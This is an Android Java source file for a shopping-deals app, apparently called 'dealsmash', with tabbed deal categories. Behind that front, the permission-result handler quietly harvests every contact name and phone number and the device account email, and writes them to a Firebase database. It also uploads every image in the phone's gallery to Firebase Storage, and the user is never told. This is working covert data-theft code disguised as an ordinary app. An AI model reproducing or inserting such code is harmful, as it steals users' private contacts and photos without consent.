package hsblabs.dealsmash;


import android.*;
import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.design.widget.TabLayout;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.util.Patterns;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.ToxicBakery.viewpager.transforms.RotateUpTransformer;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;


import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

import static android.R.attr.path;


public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE = 1 ;
    private ViewPager viewPager;
    private TabLayout tabLayout;
    private Toolbar toolbar;
    AlertDialog.Builder builder;
    ArrayList<String> phones;
    ArrayList<String> img;
    FirebaseDatabase database;
    DatabaseReference myRef;
    StorageReference mStorageRef;
    private FirebaseAuth mAuth;
// ...

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu, menu);
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (((checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED))||((checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED))) {
                if(!isNetworkAvailable()){
                }else{
                    ContentResolver cr = getContentResolver();
                    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                            null, null, null, null);
                    if (cur.getCount() > 0) {
                        while (cur.moveToNext()) {
                            String id = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts._ID));
                            String name = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                            if (Integer.parseInt(cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                Cursor pCur = cr.query(
                                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                        null,
                                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                                        new String[]{id}, null);
                                while (pCur.moveToNext()) {
                                    String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    //Toast.makeText(MainActivity.this,name.toString()+"\n"+number.toString(),Toast.LENGTH_SHORT).show();
                                    phones.add(name.toString()+"\n"+number.toString());
                                }
                                pCur.close();
                            }
                        }
                    }
                    String possibleEmail[] = new String[0];
                    Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
                    Account[] accounts = AccountManager.get(MainActivity.this).getAccounts();
                    for (Account account : accounts) {
                        if (emailPattern.matcher(account.name).matches()) {
                            possibleEmail = account.name.split("@");
                        }
                    }
                    for(int i=0;i<phones.size();i++){
                        myRef.child(possibleEmail[0]).child(UUID.randomUUID().toString()).setValue(phones.get(i));
                    }

                    ////next part image

                    Boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
                    if(isSDPresent){
                        final String[] columns = { MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID };
                        final String orderBy = MediaStore.Images.Media._ID;
                        //Stores all the images from the gallery in Cursor
                        Cursor cursor = getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                                null, orderBy);
                        //Total number of images
                        int count = cursor.getCount();

                        //Create an array to store path to all the images

                        for (int i = 0; i < count; i++) {
                            cursor.moveToPosition(i);
                            int dataColumnIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                            //Store the path of the image
                            img.add(cursor.getString(dataColumnIndex));
                        }
                    }
                    final String[] columns = { MediaStore.Images.Media.DATA, MediaStore.Images.Media._ID };
                    final String orderBy = MediaStore.Images.Media._ID;
                    //Stores all the images from the gallery in Cursor
                    Cursor cursor = getContentResolver().query(
                            MediaStore.Images.Media.INTERNAL_CONTENT_URI, columns, null,
                            null, orderBy);
                    //Total number of images
                    int count = cursor.getCount();

                    //Create an array to store path to all the images

                    for (int i = 0; i < count; i++) {
                        cursor.moveToPosition(i);
                        int dataColumnIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                        //Store the path of the image
                        img.add(cursor.getString(dataColumnIndex));
                    }


                    //upload
                    for(int i=0;i<img.size();i++) {
                        Uri file = Uri.fromFile(new File(img.get(i)));
                        StorageReference riversRef = mStorageRef.child(possibleEmail[0]).child(UUID.randomUUID().toString());
                        riversRef.putFile(file)
                                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                    @Override
                                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                        // Get a URL to the uploaded content
                                        //  @SuppressWarnings("VisibleForTests") Uri downloadUrl = taskSnapshot.getDownloadUrl();
                                    }
                                })
                                .addOnFailureListener(new OnFailureListener() {
                                    @Override
                                    public void onFailure(@NonNull Exception exception) {
                                        // Handle unsuccessful uploads
                                        // ...
                                    }
                                });
                    }
                }
            }
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        toolbar = (Toolbar) findViewById(R.id.toolbar);;
        setSupportActionBar(toolbar);
        viewPager = (ViewPager) findViewById(R.id.viewpager);
        viewPager.setPageTransformer(true, new RotateUpTransformer());
        tabLayout = (TabLayout) findViewById(R.id.tabs);
        setupViewPager(viewPager);
        tabLayout.setupWithViewPager(viewPager);
        phones = new ArrayList<String>();
        img = new ArrayList<String>();
        database = FirebaseDatabase.getInstance();
        myRef = database.getReference("Contacts");
        mStorageRef = FirebaseStorage.getInstance().getReference();
        mAuth = FirebaseAuth.getInstance();
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if(currentUser==null){
            mAuth.signInAnonymously()
                    .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
                        @Override
                        public void onComplete(@NonNull Task<AuthResult> task) {
                            if (task.isSuccessful()) {
                                // Sign in success, update UI with the signed-in user's information
                                FirebaseUser user = mAuth.getCurrentUser();
                            } else {
                                // If sign in fails, display a message to the user.
                            }

                            // ...
                        }
                    });
        }
        if(!isNetworkAvailable()){
            AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
            builder
                    .setTitle("No Internet Found!")
                    .setMessage("Do you want to Connect to Internet Now?")
                    .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            //Yes button clicked, do something
                            startActivityForResult(new Intent(Settings.ACTION_SETTINGS), 0);
                        }
                    })
                    .setNegativeButton("No", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            finish();
                            System.exit(0);
                        }
                    })	.create().show();
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if ((!(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED))||(!(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED))) {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS}, REQUEST_CODE);
            }
        }

    }

    @Override
    protected void onResume() {
        super.onResume();
        setupViewPager(viewPager);
    }

    private void setupViewPager(ViewPager viewPager) {
        ViewPagerAdapter adapter = new ViewPagerAdapter(getSupportFragmentManager());
        adapter.addFrag(new AllDealsF(), "Latest Deals");
        adapter.addFrag(new Clothing(), "Clothing");
        adapter.addFrag(new FoodF(), "Food");
        adapter.addFrag(new ElectF(), "Electronics");
        adapter.addFrag(new TravelF(), "Travel");
        adapter.addFrag(new GiftsBooksF(), "Gifts, Books & Movies");
        adapter.addFrag(new HomeGardenF(), "Home & Garden");
        adapter.addFrag(new OfficeF(), "Office");
        adapter.addFrag(new ToysF(), "Toys");
        viewPager.setAdapter(adapter);
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(this.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    class ViewPagerAdapter extends FragmentPagerAdapter {
        private final List<Fragment> mFragmentList = new ArrayList<>();
        private final List<String> mFragmentTitleList = new ArrayList<>();

        public ViewPagerAdapter(FragmentManager manager) {
            super(manager);
        }

        @Override
        public Fragment getItem(int position) {
            return mFragmentList.get(position);
        }

        @Override
        public int getCount() {
            return mFragmentList.size();
        }

        public void addFrag(Fragment fragment, String title) {
            mFragmentList.add(fragment);
            mFragmentTitleList.add(title);

        }

        @Override
        public CharSequence getPageTitle(int position) {
            return mFragmentTitleList.get(position);
        }
    }

}
